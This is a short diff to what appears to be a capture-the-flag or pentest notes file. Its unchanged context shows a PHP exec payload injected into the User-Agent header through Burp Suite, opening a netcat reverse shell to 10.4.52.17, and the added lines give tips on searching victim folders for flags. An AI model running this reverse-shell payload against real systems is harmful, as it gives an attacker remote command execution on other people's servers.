@@ -136,6 +136,14 @@ Intercept with the burpsuite and inject netcat payload in php exec in User-Agent
 User-Agent: <?php exec('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.52.17 1234 >/tmp/f')?>
 
 After that don't forget to close the foxyproxy and refresh the page again to get reverse shell.
+______________________________________________________________________________________________________________________________
+Sometimes don't forget to check Videos, Documents, Desktop, Downloads, folders in victim machine.
+
+Can also find the flag or file with locate command instead of find command.
+                                    -------
+
+
+
 
 
 
